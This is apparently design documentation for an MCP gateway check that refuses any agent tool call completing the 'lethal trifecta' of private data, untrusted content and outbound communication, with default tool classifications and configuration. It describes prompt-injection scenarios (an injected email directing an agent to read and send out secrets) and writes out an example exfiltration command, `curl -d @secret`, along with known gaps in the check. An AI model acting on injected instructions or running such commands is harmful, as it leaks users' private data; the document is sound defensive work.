# Lethal-trifecta blocking

An agent session is exfiltration-ready when it combines all three of:

| Axis | Meaning | Example |
|---|---|---|
| `privateData` | reads things that are not public | ssh-mcp reading a host's files |
| `untrustedContent` | ingests text an outsider controls | reading an inbox anyone can mail |
| `externalComm` | can move data somewhere an outsider can read | `send_email`; `curl` on a host |

Any two are fine. With all three, one prompt-injected email can tell the agent to
read something sensitive and send it out. Network isolation does not help when the
sending channel is deliberately allowed outbound.

The gateway classifies each tool on the three axes and tracks which axes each MCP
session has touched. It **refuses the call that would complete the set**. The
model comes from Open Edison. None of its GPL-3.0 code is used; `src/trifecta.ts`
is an independent implementation.

## Behaviour

- Checked on every `tools/call` after the tool resolves to a backend and **before
  anything is forwarded**. A refused call never reaches the backend.
- Runs **after per-tool authorization** (`policy.ts`). Authorization decides
  whether this caller may use the tool at all; this check decides whether this
  session may use it now. A call that authz denies is never counted against the
  session.
- A refused call returns JSON-RPC error `-32010`. Its message names the tool, the
  axis it would add, and the earlier tools that supplied the other two. `error.data.trifecta`
  carries the same detail.
- The session stays open. Calls that would not complete the set keep working, and
  the refused call adds nothing to the session's state.
- A tool classified with no axes is always allowed. If an override or monitor mode
  has let a session reach all three axes, any further call that carries an axis is
  refused unless a rule covers that call too. An override is for one specific call,
  not a licence for the rest of the session.
- An allowed call's axes are recorded **when it is forwarded**, not when it
  succeeds. A failing backend call can still return content in its error text.
- State is per MCP transport session id, the same key as caller identity. It is
  dropped in `disposeSession()` on close, error or idle reap. Sessions never share
  it. stdio mode, or a request whose session id cannot be resolved, uses one shared
  bucket. Sharing only makes the check stricter.
- Every refused call is in the tools/call audit log with `ok:false`, the caller
  identity, `errorCode:-32010` and a `trifecta` object holding `sessionAxes`,
  `toolAxes`, `completing`, `sources` and `blocked:true`. Calls that an allow rule
  or monitor mode let through are audited the same way, with `blocked:false` and,
  for overrides, the rule's `reason`.

## Default classification

Backends are recognised by their stdio command line (`ssh-mcp`, `imap-mcp`,
`catalog-server`, `context7-mcp` as a path or package segment), not by their name. A new ssh host
is therefore classified as soon as it is added.

**ssh-mcp.** Every tool counts as `privateData`.

| Tools | Axes |
|---|---|
| `read-command`, `sftp-list`, `sftp-download`, `sftp-download-file`, `list-connections`, `list-sessions`, `read-session-output`, `close-session`, `signal-process` | private |
| `run-command`, `privileged-command`, `open-session`, `sftp-upload`, `sftp-upload-file` | private + **external** |
| any other / future ssh-mcp tool | private + external |

ssh-mcp does count as external communication. Any tool that runs an arbitrary
command can run `curl -d @secret https://...`, and the *host's* network is not
isolated even when the gateway's is. `read-command` is the exception: ssh-mcp
enforces it against a read-only allowlist that excludes curl and wget and refuses
every shell control character. `sftp-upload` counts because writing a chosen file
to a host (a cron entry, a hook) is a deferred command.

ssh reads are **not** `untrustedContent` by default, although host files can hold
outsider-written text such as web logs or a mail server's spool. Marking them would
make an ssh session complete the trifecta on its own. If a host's files are mostly
outsider-written, mark it with `"classify": {"<host>/*": {"untrustedContent": true}}`.

**imap-mcp.**

| Tools | Axes |
|---|---|
| `list_emails`, `search_emails`, `read_email` | untrusted |
| `send_email` | **external** |
| `list_folders`, `list_accounts`, `mark_email`, `move_email`, `delete_email` | none |
| any other imap-mcp tool | untrusted + external |

Mail is not marked `privateData` by default, so reading a message and replying to
it in one session still works. The consequence is that an injected email asking
the agent to forward *other emails* is not stopped. To close that gap, set
`"classify": {"mail/*": {"privateData": true}}`. The cost is that a reply must be
sent from a fresh session.

**Context7** (`@upstash/context7-mcp`): **external only.** Queries leave the
box. The library docs it returns are deliberately not treated as untrusted, so it
keeps working in ssh sessions, where it is used most. ssh plus Context7 is two
axes. Adding a mail read to that session is the third, and is refused. The
accepted residual risk is a poisoned documentation page steering an agent.

**Connector catalog** (`catalog-server`): none. It lists entries and files admin
requests, and neither leaves the box.

**Anything unrecognised: untrusted + external.** An unclassified third-party
integration is most likely an internet-facing API, such as docs lookup, search or
a SaaS. It returns outsider-written text and sends our query text out. Such a tool
is therefore refused in a session that has touched private data, and allowed
otherwise. Marking it as all three would refuse every unclassified tool on first
use. Startup and reload log the unclassified backends, so classify them
explicitly.

A tool whose effective classification is all three axes, for example an
unrecognised backend that a `classify` rule also marks `privateData`, completes
the set on its own and is refused in every session. In enforce mode, startup and
reload log a warning naming any such tool.

## Configuration: the `trifecta` section of `config/tool_policy.json`

The settings live in the per-tool authorization policy file (`policy.ts`), in its
own `trifecta` section, and are compiled with the rest of that file. They share
its properties:

- Re-read on change, with no restart or reload. Edits, whether by hand or through
  the admin `/admin/tool-policy` API, apply to the next call, including on sessions
  that are already open.
- Validated before the admin API writes them.
- **Fail closed.** A malformed `trifecta` section, such as an unknown key, a bad
  mode, a pattern that isn't `backend/tool`, a non-boolean axis, or an allow rule
  without a reason, makes the whole policy invalid. That denies every tool call
  until it is fixed, which is the authz module's rule for any invalid policy. A
  typo can never silently switch this check off.

With no file, or no `trifecta` section, the built-in defaults apply in `enforce`
mode. A file that holds only a `trifecta` section leaves authorization at
allow-all.

```json
{
  "trifecta": {
    "mode": "enforce",
    "unknown":      { "untrustedContent": true, "externalComm": true },
    "backendKinds": { "my-ssh-wrapper": "ssh-mcp" },
    "classify": {
      "some-search-api/*": { "untrustedContent": true, "externalComm": true },
      "mail/*":         { "privateData": true },
      "mail/send_email": { "privateData": false }
    },
    "allow": [
      { "identity": "reporting-bot", "tool": "mail/send_email",
        "reason": "nightly status mail; reads only host health via read-command" }
    ]
  }
}
```

- `mode`: `enforce` (default) blocks. `monitor` allows but logs and audits every
  would-block, which is useful before turning enforcement on at a new gateway.
  `off` disables the check.
- Patterns use the authz grammar: `*` or `<backend-glob>/<tool-glob>`, matched on
  the original backend and tool names, not on exposed-name overrides.
- `classify` entries are applied in file order on top of the built-in default
  for the backend's kind. Put broad patterns first and specific ones last. Only
  the axes an entry names are changed.
- `backendKinds` pins a backend to a kind when command-line detection can't
  recognise it.
- `allow` is the only way to let a completing call through. Each rule needs a
  `reason` and at least one of `identity` (a users.json username, or `static`) and
  `tool` (pattern). Identity rules never match an unresolved or anonymous caller.
  Every call a rule lets through is logged at WARN and audited with the reason.

## Known limits

- A client can reset its state by opening a new session. The check defends against
  content that hijacks an agent mid-session. It does not defend against a client
  that is itself malicious; that is what authentication and per-tool authorisation
  are for.
- Classification is per tool, not per argument. `read_email` on a trusted internal
  mailbox is still treated as untrusted.
- The check is unaware of anything outside the gateway, such as a client that also
  holds a web-fetch tool locally.
